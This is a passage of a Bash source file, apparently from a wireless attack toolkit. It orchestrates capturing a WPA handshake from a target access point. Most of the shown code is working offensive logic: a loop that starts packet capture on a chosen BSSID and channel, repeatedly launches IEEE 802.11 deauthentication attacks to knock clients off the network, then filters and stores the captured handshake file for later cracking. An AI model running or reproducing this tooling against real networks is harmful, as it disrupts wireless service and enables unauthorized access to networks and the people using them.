				# If the main capture filepath is declared
				if [[ "$Handshake_Capture_handshakeCaptureTempFilepath" != '' ]];
				then
					# Delete all files of the previous main capture
					Base_FsDelete -t 1 -- "$Handshake_Capture_handshakeCaptureTempFilepath"*;
				fi

				# Start the main capture
				if
					! Capture_Start -o Handshake_Capture_handshakeCaptureTempFilepath --bm "$processMetaGather_1" -x "$windowParametersHandshakeCapture" \
						-d "$deviceMain" -a "$apBssid" -c "$apChannel";
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart main capture' -- "$( (( mainCaptureStartCount > 0 )) && printf 're' )";

					return 1;
				fi

				declare mainCaptureStartCount="$(( mainCaptureStartCount + 1 ))";
			fi
		else
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'w' -nTf $'Could not start main capture of target AP (no target BSSID known)';
		fi

		###########################
		# Deauthentication attack #
		###########################

		# If no attack type(s) is declared, no target AP BSSID, or no active main capture
		if [[ ${#attackDeauthTypes[@]} == 0 || ! "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] || ! Environment_ProcessBindSearch --bm "$processMetaGather_1";
		then
			# declare apTargetDataStatus=0;
			sleep "$captureCycleWaitSeconds";

			continue;
		fi

		# If more than 1 attack type is declared and reached the attack timeout
		if (( ${#attackDeauthTypes[@]} > 1 )) && (( attackDeauthStartTime + deauthRestartTimeout < currentTimeSeconds ));
		then
			# Terminate current deauthentication attack if exists
			Environment_ProcessBindTerminate --bm "$processMetaAttackDeauth_1";

			# If the start time of the attack is already declared (e.g. was started previously)
			# if [[ "$attackDeauthStartTime" != 0 ]];
			# then
			# 	declare attackDeauthStartCount="$(( attackDeauthStartCount + 1 ))";
			# fi

			# declare attackDeauthStartTime="$( Misc_DateTime -t 3 )";
		fi

		# Shift the deauth attack type (loop using modulo)
		declare attackDeauthType="${attackDeauthTypes[$(( attackDeauthStartCount % ${#attackDeauthTypes[@]} ))]}";

		# If the attack type is not an integer or the attack is already running
		if [[ ! "$attackDeauthType" =~ ^(0|[1-9][0-9]*)$ ]] || Environment_ProcessBindSearch --bm "$processMetaAttackDeauth_1";
		then
			declare apTargetDataStatus=0; # Set the target AP data status to "default"
			sleep "$captureCycleWaitSeconds";

			continue;
		fi

		[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting DA (type %s%s) %s' -- \
			"$( (( attackDeauthStartCount > 0 )) && printf 'Res' || printf 'S' )" "$attackDeauthType" \
			"$( (( attackDeauthStartCount > 0 )) && printf '; %s total' "$attackDeauthStartCount" )" \
			"$( Handshake_previewAPDetails "$apBssid" "$apChannel" )";

		# Try to (re)start the target AP station deauthentication
		if
			Attacks_IEEE80211Deauth --bm "$processMetaAttackDeauth_1" -x "$windowParametersHandshakeAttackDeauth" \
				-t "$attackDeauthType" -d "$deviceMain" -a "$apBssid" -c "$apChannel";
		then
			declare attackDeauthStartTime="$( Misc_DateTime -t 3 )";
			declare attackDeauthStartCount="$(( attackDeauthStartCount + 1 ))";
		else
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart deauthentication attack' -- "$( (( attackDeauthStartCount > 0 )) && printf 're' )";
		fi

		# Set the target AP data status to "default"
		declare apTargetDataStatus=0;

		# Sleep each full cycle
		sleep "$captureCycleWaitSeconds";
	done

	##########
	# Ending #
	##########

	# Terminate all related processes
	Environment_ProcessBindTerminate --bm "$processMetaPrefixHandshake";

	if [[ "${handshakeCaptureFilepath+s}" == '' ]];
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmTf $'{{@clRed}}Failed{{@clDefault}} to capture handshake of %s' -- "$apBssid";

		return 1;
	fi

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nmTf $'{{@clLightGreen}}Obtained handshake{{@clDefault}} of %s: \'%s\'' -- \
		"$apBssid" "$( basename -- "$handshakeCaptureFilepath" 2> '/dev/null'; )";

	Misc_SoundPlay 'handshake_found';

	# Filter if requested

	# If requested to filter
	if [[ "$captureFilter" != 0 ]];
	then
		declare Handshake_captureFilteredFilepath;

		if ! Capture_Filter -o Handshake_captureFilteredFilepath -c "$handshakeCaptureFilepath" -b "$apBssid";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to prepare handshake capture file (failed to filter): \'%s\'' -- \
				"$handshakeCaptureFilepath";

			return 3;
		fi

		declare handshakeCaptureFilepath="$Handshake_captureFilteredFilepath";
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nTf $'Filtered handshake capture file';
	fi

	# Store the handshake

	declare handshakeFilename="$( basename -- "$handshakeCaptureFilepath" 2> '/dev/null'; )"; # 'capture_MAC_SSID-RAND-01.cap'
	declare handshakeFilename="${Handshake_HandshakeFilenamePrefix}_${handshakeFilename#*_}"; # 'capture_MAC_SSID-RAND-01.cap' ~> 'handshake_MAC_SSID-RAND-01.cap'
	declare handshakeCaptureCopyFilepath="${Handshake_HandshakesDirpath}/${handshakeFilename}";

	if ! Base_FsMove -c "$handshakeCaptureFilepath" "$handshakeCaptureCopyFilepath";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmTf $'{{@clLightRed}}Failed{{@clDefault}} to store handshake: \'%s\'' -- "$handshakeCaptureFilepath";

		return 2;
	fi

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nmTf $'Stored handshake: \'%s\'' -- \
		"$( basename -- "$handshakeCaptureCopyFilepath" 2> '/dev/null'; )";

	if [[ "$outputVariableReferenceName" != '' ]];
	then
		Handshake_Capture_outputVariableReference="$handshakeCaptureCopyFilepath";
		Handshake_Capture_outputVariableReferenceBssid="$apBssid";
		Handshake_Capture_outputVariableReferenceSsid="$apSsid";
		Handshake_Capture_outputVariableReferenceChannel="$apChannel";
	fi

	sleep 1;

	return 0;
}